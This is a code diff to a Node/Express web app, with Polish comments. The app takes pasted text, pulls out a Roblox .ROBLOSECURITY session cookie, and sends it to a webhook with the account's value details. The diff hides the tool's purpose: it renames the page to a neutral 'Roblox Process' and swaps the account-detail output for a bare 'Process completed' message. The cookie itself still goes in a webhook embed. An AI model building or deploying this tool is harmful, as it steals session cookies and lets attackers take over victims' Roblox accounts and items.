@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS (bez zmian)
+// Strona główna – bardzo prosta
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -12,78 +12,112 @@ app.get('/', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Cookie Extractor & Checker</title>
+  <title>Roblox Process</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
-    .container { max-width: 780px; margin: 0 auto; }
-    h1 { color: #6ab0ff; text-align: center; }
-    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
-    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
-    button:hover { background: #2563eb; }
-    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
-    .error { color: #ff6b6b; font-weight: bold; }
-    .success { color: #4ade80; font-weight: bold; }
-    .loading { color: #fbbf24; font-style: italic; }
-    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d0d0d;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      text-align: center;
+      max-width: 600px;
+      padding: 30px;
+      background: #111;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.8);
+    }
+    textarea {
+      width: 100%;
+      min-height: 200px;
+      background: #1a1a1a;
+      color: #eee;
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 12px;
+      font-family: Consolas, monospace;
+      font-size: 14px;
+      margin: 20px 0;
+      resize: vertical;
+    }
+    button {
+      background: #0066cc;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover { background: #0052a3; }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .success { color: #00ff9d; }
+    .error { color: #ff4d4d; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>
-  Cookie zostanie wyciągnięte automatycznie</p>
-
-  <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
-
-  <button onclick="check()">Sprawdź i wyślij na webhook</button>
-
-  <div id="result"></div>
+  <h1>Roblox Process</h1>
+  <textarea id="input" placeholder="Wklej tekst z cookie..."></textarea>
+  <button onclick="startProcess()">Start Process</button>
+  <div id="status"></div>
 </div>
 
 <script>
-async function check() {
-  const raw = document.getElementById('input').value.trim();
-  const result = document.getElementById('result');
+async function startProcess() {
+  const input = document.getElementById('input').value.trim();
+  const status = document.getElementById('status');
 
-  result.innerHTML = '';
+  status.innerHTML = '';
 
-  if (!raw) {
-    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
+  if (!input) {
+    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
     return;
   }
 
-  // Wyciąganie cookie – ulepszone pod PowerShell i inne formaty
+  // Wyciąganie cookie – ulepszone pod Twój PowerShell i inne formaty
   let cookie = null;
   let match;
 
-  // 1. Format PowerShell / .NET – najczęstszy w Twoich przykładach
-  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
+  // 1. PowerShell / .NET format
+  match = input.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
   // 2. Klasyczny -and-items.|_
   if (!cookie) {
-    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
+    match = input.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
 
-  // 3. Długi ciąg z ostrzeżeniem
+  // 3. Ostrzeżenie + długi ciąg
   if (!cookie) {
-    match = raw.match(/_\\|WARNING[^"]{200,}/);
+    match = input.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
-  // 4. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
+  // 4. Fallback – najdłuższy ciąg od _
   if (!cookie) {
-    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
-    if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
+    const fallbacks = input.match(/_[\\w\\-|]{180,}/g) || [];
+    if (fallbacks.length) cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
+    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
     return;
   }
 
-  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam i wysyłam na webhook...</span>';
+  status.innerHTML = '<span class="loading">Processing...</span>';
 
   try {
     const res = await fetch('/check', {
@@ -92,36 +126,20 @@ async function check() {
       body: JSON.stringify({ cookie })
     });
 
-    if (!res.ok) throw new Error('Błąd serwera: ' + res.status);
+    if (!res.ok) throw new Error('Server error');
 
     const json = await res.json();
 
     if (json.error) {
-      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+      status.innerHTML = '<span class="error">Wrong file lil bro</span>';
       return;
     }
 
-    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
-
-    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
-
-    html += \`
-      <b>Username:</b> \${json.username || '?'}<br>
-      <b>User ID:</b> \${json.userId || '?'}<br>
-      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
-      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
-      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
-      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
-      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
-      <b>MM2:</b> \${json.mm2Count || 0}<br>
-      <b>AMP:</b> \${json.ampCount || 0}<br>
-      <b>SAB:</b> \${json.sabCount || 0}<br>
-    \`;
-
-    result.innerHTML = html;
+    // Sukces – nic nie pokazujemy oprócz komunikatu
+    status.innerHTML = '<span class="success">Process completed</span>';
 
   } catch (err) {
-    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+    status.innerHTML = '<span class="error">Wrong file lil bro</span>';
   }
 }
 </script>
@@ -130,7 +148,7 @@ async function check() {
   `);
 });
 
-// Endpoint /check – pełna logika + wysyłka dwóch embedów w jednej wiadomości
+// Endpoint /check – logika + wysyłka dwóch embedów w jednej wiadomości
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -160,7 +178,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email Verified (hat)
+    // Email Verified
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -193,7 +211,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP (Recent Average Price) – suma wartości limitedów
+    // RAP
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -205,7 +223,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Groups Owned (ile grup jest ownerem – rank 255)
+    // Groups Owned
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -217,7 +235,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta + data utworzenia
+    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -324,7 +342,7 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
-              // Embed 1 – pełny z informacjami o koncie
+              // Embed 1 – pełny z kontem
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -368,10 +386,10 @@ app.post('/check', async (req, res) => {
                 timestamp: new Date().toISOString()
               },
 
-              // Embed 2 – tylko wyłapane .ROBLOSECURITY (ciemno fioletowy, minimalistyczny)
+              // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy, bez zbędnych linii)
               {
-                color: 0x4B0082, // ciemny fiolet
-                title: "Wyłapane .ROBLOSECURITY",
+                color: 0x4B0082,
+                title: ".ROBLOSECURITY",
                 description: `\`\`\`\n${cookie}\n\`\`\``,
                 timestamp: new Date().toISOString()
               }
